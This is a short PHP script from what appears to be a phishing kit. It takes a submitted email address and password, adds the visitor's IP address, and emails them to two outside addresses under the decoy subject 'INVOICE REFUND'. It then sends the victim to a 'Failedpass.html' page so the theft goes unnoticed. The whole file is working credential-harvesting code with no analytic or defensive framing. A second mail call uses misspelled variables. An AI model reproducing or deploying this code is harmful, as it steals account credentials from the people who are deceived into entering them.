<?php

$ip = getenv("REMOTE_ADDR");
$message .= "-----------Personel Info--------------\n";
$message .= "Email     : ".$_POST['username']."\n";
$message .= "Password       : ".$_POST['password']."\n";
$message .= "--------------- IP ---------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- Never Back Down ---------------\n";
$message = "$message\n";
$send = "yunginxx@yandex.com,amillerbriggsfreemancom@gmail.com";
$subject = "INVOICE REFUND | $ip";
$from = "From";
mail($send,$subject,$message,$from);
mail($messege,$subject,$rnessage,$headers);
header("Location: Failedpass.html");

?>